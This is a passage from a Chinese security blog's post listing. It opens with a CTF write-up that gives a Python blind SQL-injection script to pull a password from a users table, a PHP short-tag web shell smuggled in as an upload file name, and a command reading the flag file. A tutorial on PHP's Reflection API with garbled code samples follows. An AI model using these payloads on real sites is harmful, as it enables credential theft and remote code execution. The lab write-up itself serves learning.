<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://803aae5e-79fb-4520-960c-d67666295f67.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">payload = <span class="string">&quot; or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125;%23&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid= (low+high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;JFIF&#x27;</span> <span class="keyword">in</span> s.get(url+payload.format(i,mid)).text:</span><br><span class="line">        low=mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        result +=chr(mid)</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>

<p>跑出账号密码，登陆以后发现可以上传文件：<br>随便上传了一个内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I logged the file name you uploaded to logs&#x2F;upload.d74bd5e2a76d1aa9b34f21ca9e866a8b.log.php. LOL</span><br></pre></td></tr></table></figure>

<p>无法上传php文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522201428.png" alt="img"></p>
<p>但是可以发现 我们存入的文件名都出现在了这个php文件当中<br>如果我们传入一句话木马文件名，那么就会被这个php解析了</p>
<p>由于php被过滤了，所以这里我们使用短标签进行绕过:<br>burp抓包，改文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;@eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>POST数据或者蚁剑连接都行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>有点久没刷题了、。。罪过，这次也是收获了不少，感觉sql的调试技巧有点遗忘了，直接复制代码会本地测试就行了~</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/15/CTF%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/">CTF中的php反射</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-15</time><div class="content"><h2 id="反射是什么？"><a href="#反射是什么？" class="headerlink" title="反射是什么？"></a><strong>反射是什么？</strong></h2><p>它是指在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。</p>
<p>其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p>
<p>PHP反射api由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。</p>
<p>反射api是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。</p>
<p>平常我们用的比较多的是 <strong>ReflectionClass类</strong> 和 <strong>ReflectionMethod类</strong>，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;class&#96; &#96;Person&#96;&#96;&#123;&#96;&#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* For the sake of demonstration, we&quot;re setting this private&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;private&#96; &#96;$_allowDynamicAttributes&#96; &#96;&#x3D; false;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;primary_autoincrement&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$id&#96; &#96;&#x3D; 0;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;varchar length&#x3D;255 null&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$name&#96;&#96;;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;text null&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$biography&#96;&#96;;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getId()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;id;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setId(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;id &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getName()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;name;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setName(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;name &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getBiography()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;biography;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setBiography(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;biography &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96;&#96;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>一、通过ReflectionClass，我们可以得到Person类的以下信息：</strong></p>
<ol>
<li>常量 Contants</li>
<li>属性 Property Names</li>
<li>方法 Method Names静态</li>
<li>属性 Static Properties</li>
<li>命名空间 Namespace</li>
<li>Person类是否为final或者abstract</li>
<li>Person类是否有某个方法</li>
</ol>
<p>接下来反射它，只要把类名”Person”传递给ReflectionClass就可以了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$class&#96; &#96;&#x3D; &#96;&#96;new&#96; &#96;ReflectionClass(&#96;&#96;&#39;Person&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 建立 Person这个类的反射类 &#96;&#96;$instance&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;newInstanceArgs(&#96;&#96;$args&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 相当于实例化Person 类</span><br></pre></td></tr></table></figure>



<p><strong>1）获取属性(Properties)：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;$properties&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getProperties();&#96;&#96;foreach&#96; &#96;(&#96;&#96;$properties&#96; &#96;as&#96; &#96;$property&#96;&#96;)&#96;&#96;&#123;&#96;&#96;  &#96;&#96;echo&#96; &#96;$property&#96;&#96;-&gt;getName() . &#96;&#96;&quot;\n&quot;&#96;&#96;;&#96;&#96;&#125;&#96;&#96;&#x2F;&#x2F; 输出:&#96;&#96;&#x2F;&#x2F; _allowDynamicAttributes&#96;&#96;&#x2F;&#x2F; id&#96;&#96;&#x2F;&#x2F; name&#96;&#96;&#x2F;&#x2F; biography</span><br></pre></td></tr></table></figure>

<p>默认情况下，ReflectionClass会获取到所有的属性，private 和 protected的也可以。如果只想获取到private属性，就要额外传个参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$private_properties&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getProperties(ReflectionProperty::IS_PRIVATE);</span><br></pre></td></tr></table></figure>

<p>可用参数列表：</p>
<ul>
<li>ReflectionProperty::IS_STATIC</li>
<li>ReflectionProperty::IS_PUBLIC</li>
<li>ReflectionProperty::IS_PROTECTED</li>
<li>ReflectionProperty::IS_PRIVATE</li>
</ul>
<p>通过$property-&gt;getName()可以得到属性名。</p>
<p><strong>2）获取注释：</strong></p>
<p>通过getDocComment可以得到写给property的注释。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;foreach&#96; &#96;(&#96;&#96;$properties&#96; &#96;as&#96; &#96;$property&#96;&#96;)&#96;&#96;&#123;&#96;&#96;  &#96;&#96;if&#96; &#96;(&#96;&#96;$property&#96;&#96;-&gt;isProtected())&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$docblock&#96; &#96;&#x3D; &#96;&#96;$property&#96;&#96;-&gt;getDocComment();&#96;&#96;    &#96;&#96;preg_match(&#96;&#96;&#39;&#x2F; type\&#x3D;([a-z_]*) &#x2F;&#39;&#96;&#96;, &#96;&#96;$property&#96;&#96;-&gt;getDocComment(), &#96;&#96;$matches&#96;&#96;);&#96;&#96;    &#96;&#96;echo&#96; &#96;$matches&#96;&#96;[1] . &#96;&#96;&quot;\n&quot;&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96;&#96;&#125;&#96;&#96;&#x2F;&#x2F; Output:&#96;&#96;&#x2F;&#x2F; primary_autoincrement&#96;&#96;&#x2F;&#x2F; varchar&#96;&#96;&#x2F;&#x2F; text</span><br></pre></td></tr></table></figure>



<p><strong>3）获取类的方法</strong></p>
<ul>
<li>getMethods()    来获取到类的所有methods。</li>
<li>hasMethod(string)  是否存在某个方法</li>
<li>getMethod(string)  获取方法</li>
</ul>
<p><strong>4）执行类的方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$instance&#96;&#96;-&gt;getName(); &#96;&#96;&#x2F;&#x2F; 执行Person 里的方法getName&#96;&#96;&#x2F;&#x2F; 或者：&#96;&#96;$method&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getmethod(&#96;&#96;&#39;getName&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 获取Person 类中的getName方法&#96;&#96;$method&#96;&#96;-&gt;invoke(&#96;&#96;$instance&#96;&#96;);       &#96;&#96;&#x2F;&#x2F; 执行getName 方法&#96;&#96;&#x2F;&#x2F; 或者：&#96;&#96;$method&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getmethod(&#96;&#96;&#39;setName&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 获取Person 类中的setName方法&#96;&#96;$method&#96;&#96;-&gt;invokeArgs(&#96;&#96;$instance&#96;&#96;, &#96;&#96;array&#96;&#96;(&#96;&#96;&#39;snsgou.com&#39;&#96;&#96;));</span><br></pre></td></tr></table></figure>



<p><strong>二、通过ReflectionMethod，我们可以得到Person类的某个方法的信息：</strong></p>
<ol>
<li>是否“public”、“protected”、“private” 、“static”类型</li>
<li>方法的参数列表</li>
<li>方法的参数个数</li>
<li>反调用类的方法</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;&#x2F;&#x2F; 执行detail方法 $method&#96;&#x3D; new ReflectionMethod(&#39;Person&#39;, &#39;test&#39;);&#96;&#96;if&#96; &#96;(&#96;&#96;$method&#96;&#96;-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic())&#96;&#96;&#123;&#96;&#96;  &#96;&#96;echo&#96; &#96;&#39;Action is right&#39;&#96;&#96;;&#96;&#96;&#125;&#96;&#96;echo&#96; &#96;$method&#96;&#96;-&gt;getNumberOfParameters(); &#96;&#96;&#x2F;&#x2F; 参数个数&#96;&#96;echo&#96; &#96;$method&#96;&#96;-&gt;getParameters(); &#96;&#96;&#x2F;&#x2F; 参数对象数组</span><br></pre></td></tr></table></figure>



</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/09/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/">逆向入门（一）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-09</time><div class="content"></div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>